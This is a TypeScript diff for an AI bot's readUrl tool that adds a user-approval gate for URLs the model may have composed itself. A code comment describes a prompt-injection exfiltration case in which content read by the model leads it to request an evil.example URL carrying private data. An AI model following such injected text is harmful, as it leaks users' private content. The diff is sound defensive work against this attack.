@@ -11,6 +11,10 @@ import type {
   Tool,
 } from '@cardstack/base/matrix-event';
 import { parseLenientJson } from './lenient-json.ts';
+import {
+  getToolRequests,
+  isToolResultEventType,
+} from '@cardstack/runtime-common/matrix-constants';
 
 let log = logger('ai-bot:read-url');
 
@@ -79,19 +83,11 @@ export function urlFromReadUrlArguments(
   return match?.[1];
 }
 
-// The timeline label for a readUrl call: the host and path, without the
-// scheme or query, so the user sees which page is being read.
+// The timeline label for a readUrl call: the full URL, query string
+// included, so the user sees exactly what is requested — and, for a URL
+// awaiting approval, exactly what they are approving.
 export function readUrlLabel(url: string | undefined): string {
-  if (!url) {
-    return 'Read web page';
-  }
-  try {
-    let parsed = new URL(url);
-    let path = parsed.pathname === '/' ? '' : parsed.pathname;
-    return `Read web page: ${parsed.host}${path}`;
-  } catch {
-    return `Read web page: ${url}`;
-  }
+  return url ? `Read web page: ${url}` : 'Read web page';
 }
 
 // --- Limits ---------------------------------------------------------------
@@ -370,6 +366,234 @@ function realmRefusal(url: string, realmFileReadingAllowed: boolean): string {
   return realmFileReadingAllowed
     ? `${url} is in a Boxel realm, which readUrl does not read. Read it with readRealmFile instead (for a card instance, read its .json file).`
     : `${url} is in a Boxel realm, which readUrl does not read, and realm files cannot be read in this room. Ask the user to attach the file or card to their message instead.`;
+}
+
+// --- URLs the model may read without approval -------------------------------
+
+// readUrl would otherwise be a way to send data out: text in a page, card or
+// skill the model reads could get it to request
+// https://evil.example/?d=<private content>. So readUrl reads without asking
+// only URLs the model cannot have composed: one a human wrote in the room, or
+// one that appeared, exactly, on a page readUrl already read. Any other URL
+// waits for the user to approve it with the full URL in front of them.
+export class PreapprovedUrls {
+  #urls = new Set<string>();
+
+  add(url: string): void {
+    let normalized = normalizeForApproval(url);
+    if (normalized) {
+      this.#urls.add(normalized);
+    }
+  }
+
+  addAllIn(text: string): void {
+    for (let url of urlsInText(text)) {
+      this.add(url);
+    }
+  }
+
+  has(url: string): boolean {
+    let normalized = normalizeForApproval(url);
+    return normalized !== undefined && this.#urls.has(normalized);
+  }
+}
+
+// Two spellings of one URL compare equal: the URL parser settles case in the
+// scheme and host, default ports and percent-encoding, and the fragment is
+// dropped since it never reaches the server.
+function normalizeForApproval(url: string): string | undefined {
+  try {
+    let parsed = new URL(url);
+    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
+      return undefined;
+    }
+    parsed.hash = '';
+    return parsed.href;
+  } catch {
+    return undefined;
+  }
+}
+
+const URL_IN_TEXT_RE = /https?:\/\/[^\s<>"'`]+/g;
+
+// The http(s) URLs written in a piece of text — a message, or a read page's
+// document. Entity-encoded ampersands are decoded and trailing sentence
+// punctuation and unbalanced closing brackets are trimmed.
+export function urlsInText(text: string): string[] {
+  let urls: string[] = [];
+  for (let match of text.matchAll(URL_IN_TEXT_RE)) {
+    let url = match[0].replace(/&amp;/g, '&');
+    for (;;) {
+      let trimmed = url.replace(/[.,;:!?*_]+$/, '');
+      let last = trimmed.at(-1);
+      let unbalanced =
+        (last === ')' && !trimmed.includes('(')) ||
+        (last === ']' && !trimmed.includes('['));
+      if (unbalanced) {
+        trimmed = trimmed.slice(0, -1);
+      }
+      if (trimmed === url) {
+        break;
+      }
+      url = trimmed;
+    }
+    urls.push(url);
+  }
+  return urls;
+}
+
+function eventData(
+  event: DiscreteMatrixEvent,
+): Record<string, any> | undefined {
+  let data = (event.content as { data?: unknown })?.data;
+  if (typeof data === 'string') {
+    try {
+      data = JSON.parse(data);
+    } catch {
+      return undefined;
+    }
+  }
+  return data && typeof data === 'object'
+    ? (data as Record<string, any>)
+    : undefined;
+}
+
+// The URLs readUrl may read in this room without approval: every URL a human
+// wrote in a message, and every URL on a page readUrl read (the documents of
+// its applied results, downloaded with `downloadText`).
+export async function collectPreapprovedUrls(
+  history: DiscreteMatrixEvent[],
+  aiBotUserId: string,
+  downloadText: (file: { url: string; contentType: string }) => Promise<string>,
+): Promise<PreapprovedUrls> {
+  let approved = new PreapprovedUrls();
+  let readUrlRequestIds = new Set<string>();
+  for (let event of history) {
+    if (event.type !== 'm.room.message') {
+      continue;
+    }
+    let content = event.content as Record<string, any>;
+    if (event.sender === aiBotUserId) {
+      for (let request of getToolRequests<{ id?: string; name?: string }>(
+        content,
+      ) ?? []) {
+        if (request?.name === READ_URL_TOOL_NAME && request.id) {
+          readUrlRequestIds.add(request.id);
+        }
+      }
+      continue;
+    }
+    for (let field of [content.body, content.formatted_body]) {
+      if (typeof field === 'string') {
+        approved.addAllIn(field);
+      }
+    }
+  }
+  for (let event of history) {
+    let content = event.content as Record<string, any>;
+    if (
+      !isToolResultEventType(event.type) ||
+      event.sender !== aiBotUserId ||
+      !readUrlRequestIds.has(content?.commandRequestId) ||
+      content?.['m.relates_to']?.key !== 'applied'
+    ) {
+      continue;
+    }
+    for (let file of eventData(event)?.attachedFiles ?? []) {
+      if (file?.url && file.contentType === 'text/plain') {
+        try {
+          approved.addAllIn(
+            await downloadText({
+              url: file.url,
+              contentType: file.contentType,
+            }),
+          );
+        } catch (e: any) {
+          log.info(
+            `readUrl: could not load an earlier read to approve its links: ${e?.message ?? e}`,
+          );
+        }
+      }
+    }
+  }
+  return approved;
+}
+
+// The readUrl call a user's approval releases: `approval` is a tool-result
+// event with the 'approved' key that a human sent. It releases the call only
+// when that call is a readUrl the bot held for approval and has no outcome
+// yet, so a repeated or stray approval never reads twice. Returns the call
+// and the bot message carrying it, or undefined.
+export function readUrlCallReleasedByApproval(
+  history: DiscreteMatrixEvent[],
+  approval: { sender?: string; content?: Record<string, any> },
+  aiBotUserId: string,
+):
+  | {
+      call: {
+        id: string;
+        type: 'function';
+        function: { name: string; arguments: string };
+      };
+      requestEventId: string;
+    }
+  | undefined {
+  let content = approval.content;
+  if (
+    !approval.sender ||
+    approval.sender === aiBotUserId ||
+    content?.['m.relates_to']?.key !== 'approved' ||
+    typeof content?.commandRequestId !== 'string'
+  ) {
+    return undefined;
+  }
+  let callId: string = content.commandRequestId;
+  let alreadySettled = history.some(
+    (event) =>
+      isToolResultEventType(event.type) &&
+      (event.content as Record<string, any>)?.commandRequestId === callId &&
+      (event.content as Record<string, any>)?.['m.relates_to']?.key !==
+        'approved',
+  );
+  if (alreadySettled) {
+    return undefined;
+  }
+  for (let event of history) {
+    if (event.type !== 'm.room.message' || event.sender !== aiBotUserId) {
+      continue;
+    }
+    let request = (
+      getToolRequests<{
+        id?: string;
+        name?: string;
+        arguments?: unknown;
+        approvalRequired?: boolean;
+      }>(event.content as Record<string, any>) ?? []
+    ).find((candidate) => candidate?.id === callId);
+    if (
+      !request ||
+      request.name !== READ_URL_TOOL_NAME ||
+      request.approvalRequired !== true ||
+      !event.event_id
+    ) {
+      continue;
+    }
+    return {
+      call: {
+        id: callId,
+        type: 'function',
+        function: {
+          name: READ_URL_TOOL_NAME,
+          arguments:
+            typeof request.arguments === 'string'
+              ? request.arguments
+              : JSON.stringify(request.arguments ?? {}),
+        },
+      },
+      requestEventId: event.event_id,
+    };
+  }
+  return undefined;
 }
 
 // --- Reading --------------------------------------------------------------
